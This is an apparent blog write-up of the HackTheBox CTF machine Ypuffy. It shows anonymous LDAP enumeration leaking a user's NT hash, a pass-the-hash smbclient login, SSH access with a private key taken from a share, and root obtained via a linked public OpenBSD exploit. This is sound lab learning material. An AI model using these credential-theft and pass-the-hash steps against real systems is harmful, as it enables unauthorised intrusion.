---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-02-08-ypuffy-hackthebox
tags:
- hackthebox
- kernel exploit
- ldap
- openbsd
title: Ypuffy @ HackTheBox
---

Ypuffy is a rather unique machine on [hackthebox.eu](https://www.hackthebox.eu) because it features OpenBSD as operating system. In my version of getting root it didn’t matter too much unfortunately because a public kernel exploit gave root quite easily. Ypuffy features ldap and smb enumeration and then application of public exploit for OpenBSD.

## User Flag

Scanning the box shows that port 389 is open and that one can potentially retrieve information without the need of credentials.

```
...
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
...
```

Using nmaps ldap-search some interesting information can be revealed:

```
...
|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
|         uid: alice1978
|         cn: Alice
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: sambaSamAccount
|         userPassword: {BSDAUTH}alice1978
|         uidNumber: 5000
|         gidNumber: 5000
|         gecos: Alice
|         homeDirectory: /home/alice1978
|         loginShell: /bin/ksh
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
|         displayName: Alice
|         sambaAcctFlags: [U          ]
|         sambaPasswordHistory: 
|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
|         sambaPwdLastSet: 1532916644
...
```

The credentials can be used to connect via smb:

```
python2 /usr/bin/smbclient.py YPUFFY/alice1978@10.10.10.107 -hashes 00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B
```

Issuing `shares` it can be seen that a share named  
"alice" exist. With `use alice` it can be selected, a private key named "my\_private\_key.ppk" retrieved and the key been used to ssh into the box as "alice1987" to grab the userflag:

```
ssh alice1978@10.10.10.107 -i alice.priv
```

## Root Flag

Turns out the box uses Openbsd – looking for fitting kernel exploits, [raptor\_xorgasm](https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm) can be found. After compiling and executing the exploit we become root and can read flag.